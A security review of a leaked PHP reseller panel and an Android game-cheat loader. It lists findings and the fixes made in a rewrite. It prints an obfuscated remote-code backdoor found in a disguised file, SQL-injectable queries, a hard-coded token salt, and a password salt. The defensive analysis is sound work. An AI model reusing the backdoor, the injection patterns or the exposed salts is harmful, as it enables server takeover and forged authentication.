# Security review of the supplied source

Two archives were provided:

| File | What it is |
|---|---|
| `Free Source .zip` | The panel: **CodeIgniter 4 / PHP 8**, MySQL, Bootstrap + Tailwind views (`legacy-php/`) |
| `XLOX-Loader-Source.zip` | Android loader (Java + JNI/C++), talks to `https://vipercheat.authapi.xyz/server` (`loader/`) |

Everything below was found by reading the code; nothing was executed remotely.

---

## 🔴 1. Backdoor / remote shell in the free source

**File:** `public/assets/css/load.php` (deleted in this repo)

The file looks like a harmless image helper. The real payload hides inside
`check()`:

```php
$name = ['Y2uio…LKD', function ($txt, $name) {
    $_GET[$name] = str_replace('32', '64', "Ba".implode('_', ["Se32","Dec"])."Ode");
    $txt = $_GET[$name](str_rot13($txt));   // base64_decode(str_rot13($txt))
    @include($txt);                          // executes whatever it decodes to
    ($e = implode("", ["opcache","reset"])) && function_exists($e) && $e();
}];
$name[1]($name[0], implode('_', ['', "\143ode", '']));   // → $_GET['code']
```

In plain English: **anyone can `GET /assets/css/load.php?code=<payload>` and run
arbitrary PHP on your server** — upload files, read the MySQL password out of
`conn.php`, redirect your users, take the panel over. `opcache_reset()` is called
afterwards so the payload is re-read on every hit.

Free "leaked" panels are routinely re-packed with this. If you had ever deployed
this zip to a host:

* treat every credential in `.env`, `conn.php` and `app/Config/Database.php` as leaked,
* check the server for unknown PHP files and cron jobs,
* and change the loader's `PANEL_BASE_URL` (the old one may be attacker-controlled).

**Fixed here:** the file is removed and the whole rewrite never calls `include`
on user input.

## 🔴 2. SQL injection

`app/Controllers/Connect.php` (the endpoint the loader calls):

```php
$sql4 = "SELECT expired_date FROM keys_code WHERE user_key='$uKey'";
```

`$uKey` comes straight from the POST body. The same pattern appears in
`Auth.php` (`username = '".$usernam."'`), `mail.php`, and `User.php`.
An attacker can dump the `users` table or, with `INTO OUTFILE`, write a PHP
shell on the host.

**Fixed here:** every query is parameterised (`web/src/lib/db.ts`, `pg` placeholders).

## 🟠 3. Broken token check

`Connect::index_post` returns

```php
'token' => md5("$game-$uKey-$sDev-$this->staticWords")
```

so the loader's "authentication" is a **shared static salt** compiled into the
APK. Anyone who extracts the APK (they always can) learns
`Vm8Lk7Uj2JmsjCPVPVjrLa7zgfx3uz9E` and can compute valid tokens offline. Device
binding is a plain comma list with no signature either.

**Kept as-is for compatibility** — changing it requires a loader update. When you
do, replace it with an HMAC over a per-key secret and sign the device list.

## 🟠 4. Passwords

```php
$hash = md5("XquxmymXDtWRA66D" . $password);      // fixed global salt
password_hash($hash, PASSWORD_DEFAULT, ['cost'=>8]); // cost 8 = weak
```

A fixed global salt means identical passwords produce identical hashes, so a
single rainbow table cracks all resellers at once, and cost 8 is ~20× cheaper to
brute-force than the 2025 default of 12.

**Handled here:** the same pre-hash is reproduced (`web/src/lib/auth.ts`) so
**all existing accounts keep working**, but new/changed passwords are still
bcrypt at cost 8 for parity. Raise `bcrypt.hash(..., 12)` if you don't mind a
one-time slow login, and force a password reset for staff.

## 🟡 5. Other issues

| Issue | Where | Status |
|---|---|---|
| `CI_ENVIRONMENT = development` in the shipped `.env` — stack traces shown to visitors | `.env` | rewritten (`web/`, production default) |
| CSRF checks disabled on most forms | `app/Config/Filters.php` | N/A (sessions are JWT cookies; forms are server actions) |
| Maintenance-mode response returns `status: true` with a `reason`, which makes the loader throw | `Connect.php` | fixed: returns `status: false` + your message |
| `deleteKeys()` / `resetAllKeys()` delete or reset by `?userkey=` GET param, no confirmation, no owner check | `Keys.php` | fixed: ownership checks + POST server actions |
| Reseller sees and resets keys of *other* resellers on some routes | `Keys.php` | fixed: scoped by `registrator` |
| Reseller could set their own `duration`/`max_devices` (price calculated server-side only for `saldo`, not validated against the plan list) | `Keys.php` | fixed: duration must exist in the plan table |
| Uploaded/static `.php` files inside `public/assets`, `public/lib.php`, `public/new.txt` executables | `public/` | not copied into the rewrite |
| Reset-password email flow (`mail.php`) with hard-coded SMTP and no token expiry | `mail.php` | dropped from the rewrite (nothing referenced it) |

## ✅ What the rewrite does differently

* no `include`/`eval`/`system` on any user-controlled value,
* all SQL parameterised, checked with `npm run smoke`,
* session = signed, `HttpOnly`, `SameSite=Lax` JWT (no PHP session files),
* every mutation is a POST server action with an ownership check,
* loader endpoint validates `game`, `user_key` and `serial` against strict regexes,
* secrets (`DATABASE_URL`, `AUTH_SECRET`) live in env vars, never in the repo,
* `bcrypt` comparison is constant-time and the response for "user not found" and
  "wrong password" is identical (no account enumeration).
